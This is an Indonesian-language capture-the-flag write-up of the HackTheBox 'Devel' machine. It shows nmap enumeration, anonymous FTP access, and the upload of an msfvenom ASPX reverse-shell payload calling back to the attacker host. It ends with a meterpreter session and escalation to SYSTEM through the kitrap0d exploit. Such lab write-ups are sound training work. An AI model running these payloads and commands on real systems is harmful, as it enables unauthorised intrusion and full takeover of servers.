---
title: HackTheBox - Devel
date: 2022-12-24T17:00:00.000+07:00
author: Justakazh
tags:
- privesc
- '21'
- ftp
- hacking
- windows
- easy
- hackthebox
- writeup
categories: capture the flag
featured_image: "/uploads/justakazh/1-omftli_i0i-lq_2w1azkvq.png"
author_description: Aku nulis karena aku pelupa
author_avatar: "/uploads/justakazh/1656477958868.jpeg"
author_facebook: https://facebook.com/
author_twitter: https://twitter.com/akazh18
author_instagram: https://instagram.com/
author_donation: https://www.paypal.me/jawagalawbgt
author_web: https://blog.hackstreet.id/author/justakazh

---
## Summary

Machine Name : Devel

Machine Difficult : Easy

Machine Author : [ch4p](https://app.hackthebox.com/users/1)

Machine URL : [Hack The Box](https://app.hackthebox.com/machines/Devel)

## NMAP Enumeration

```bash
┌──(punktester㉿kali)-[~/…/ctf/htb/easy/devel]
└─$ sudo nmap -sV 10.129.136.185 -oN nmap-tcp-ports
[sudo] password for punktester: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 06:30 HST
Nmap scan report for 10.129.136.185
Host is up (0.20s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.25 seconds
zsh: segmentation fault  sudo nmap -sV 10.129.136.185 -oN nmap-tcp-ports
```

## 21 - FTP

dapat dilihat dari hasil scanning nmap, target tersebut memiliki port 21/ftp microsoft ftpd. langkah awal yang akan saya lakukan adalah melakukan pengecheckan terhadap anonymous login

```bash
┌──(punktester㉿kali)-[~/…/ctf/htb/easy/devel]
└─$ ftp 10.129.136.185   
Connected to 10.129.136.185.
220 Microsoft FTP Service
Name (10.129.136.185:punktester): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49157|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```

disini saya berhasil untuk login pada ftp dengan akun anonymous. selanjutnya saya mencoba untuk mencari exploit dari microsoft ftpd pada metasploit

```bash
msf6 > search Microsoft ftpd

Matching Modules
================

   #  Name                                          Disclosure Date  Rank    Check  Description
   -  ----                                          ---------------  ----    -----  -----------
   0  exploit/windows/ftp/ms09_053_ftpd_nlst        2009-08-31       great   No     MS09-053 Microsoft IIS FTP Server NLST Response Overflow
   1  auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof  2010-12-21       normal  No     Microsoft IIS FTP Server Encoded Response Overflow Trigger


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof
```

terdapat 1 module exploit yaitu **exploit/windows/ftp/ms09_053_ftpd_nlst**  module ini menyerang stack buffer overflow pada microsoft iis ftp service 

```bash
msf6 exploit(windows/ftp/ms09_053_ftpd_nlst) > options

Module options (exploit/windows/ftp/ms09_053_ftpd_nlst):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS   10.129.136.185       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    21                   yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2000 SP4 English/Italian (IIS 5.0)


msf6 exploit(windows/ftp/ms09_053_ftpd_nlst) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.129.136.185:21 - 257 "LSRSWHVOZI" directory created.
[*] 10.129.136.185:21 - 250 CWD command successful.
[*] 10.129.136.185:21 - Creating long directory...
[*] 10.129.136.185:21 - 451 No mapping for the Unicode character exists in the target multi-byte code page.
[*] 10.129.136.185:21 - 200 PORT command successful.
[*] 10.129.136.185:21 - Trying target Windows 2000 SP4 English/Italian (IIS 5.0)...
[*] 10.129.136.185:21 - 451 No mapping for the Unicode character exists in the target multi-byte code page.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/ftp/ms09_053_ftpd_nlst) > 
```

sayangnya disini saya tidak berhasil mendapatkan akses tersebut, akan tetapi jika diperhatikan pada gambar dibawah ini beberapa payload dari module tersebut berhasil terupload pada server tersebut, ini menunjukan bahwa directory tersebut writable. 

![](/home/punktester/.config/marktext/images/2022-10-14-07-03-58-image.png)

disini saya berfikir untuk mengupload aspx backdoor menggunakan ftp, langkah pertama saya membuat sebuah payload dengan **msfvenom**

```bash
┌──(punktester㉿kali)-[~/…/ctf/htb/easy/devel]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f aspx > halah.aspx 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2866 bytes
```

selanjutnya saya menjalankan module listener pada metasploit

```bash
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.15:4444 
```

selanjutnya saya mengupload file aspx yang telah dibuat tadi menggunakan ftp

```bash
ftp> put halah.aspx 
local: halah.aspx remote: halah.aspx
229 Entering Extended Passive Mode (|||49171|)
150 Opening ASCII mode data connection.
100% |*********************| 2903 28.25 MiB/s --:-- ETA
226 Transfer complete.
2903 bytes sent in 00:00 (14.37 KiB/s)
ftp> dir
229 Entering Extended Passive Mode (|||49172|)
125 Data connection already open; Transfer starting.
03-18-17 02:06AM <DIR> aspnet_client
10-14-22 03:04AM 2903 halah.aspx
03-17-17 05:37PM 689 iisstart.htm
10-14-22 02:37AM <DIR> IJXWLJHLQP
10-14-22 03:03AM <DIR> LSRSWHVOZI
10-14-22 02:42AM <DIR> NGPQBPUQBP
10-14-22 02:41AM <DIR> QXWHDTRVPU
10-14-22 03:02AM <DIR> RYPCOZGWIS
10-14-22 02:44AM <DIR> SLKGVHRIWP
10-14-22 02:41AM <DIR> TNWEJUVKYW
10-14-22 02:52AM <DIR> VXCBCGBZWI
03-17-17 05:37PM 184946 welcome.png
```

file tersebut berhasil terupload sesuai expetasi, selanjutnya saya akan mengakses file tersebut melalui browser untuk mentrigger paylaod

![](/home/punktester/.config/marktext/images/2022-10-14-07-06-47-image.png)

```bash
[*] Sending stage (175174 bytes) to 10.129.136.185
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.136.185:49173 ) at 2022-10-14 07:06:31 -1000

meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter > 
```

Saya berhasil mendapatkan akses server tersebut, namun disini saya harus melakukan privilege escalation untuk mendapatkan akses sepenuhnya dari target. disini saya menggunakan module post **multi/recon/local_exploit_suggester** yang dimana modul ini melakukan pengecheckan terhadap potensi kerentanan lokal

```bash
msf6 post(multi/recon/local_exploit_suggester) > sessions

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.15:4444 -> 10.129.136.185:49173  (10.129.136.185)

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.129.136.185 - Collecting local exploits for x86/windows...
[*] 10.129.136.185 - 40 exploit checks are being tried...
[+] 10.129.136.185 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.129.136.185 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.129.136.185 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.129.136.185 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.129.136.185 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.136.185 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.136.185 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.129.136.185 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.129.136.185 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.129.136.185 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.129.136.185 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.136.185 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.129.136.185 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > 
```

dari hasil tersebut saya mengetahui terdapat banyak kemungkinan untuk melakukan privilege escalation, disini saya akan menggunakan module exploit **exploit/windows/local/ms10_015_kitrap0d**  cara kerja module ini membuat sebuah sesi baru dengan SYSTEM privilege dari exploit KiTrap0D yang dibuat oleh Travis Ormandy

```bash
msf6 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.15  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 2872 launched.
[*] Reflectively injecting the DLL into 2872...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.129.136.185
[*] Meterpreter session 2 opened (10.10.14.15:4444 -> 10.129.136.185:49174 ) at 2022-10-14 07:19:50 -1000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

sesuai dengan ekspetasi, saya berhasil mendapatkan akses penuh pada sistem tersebut.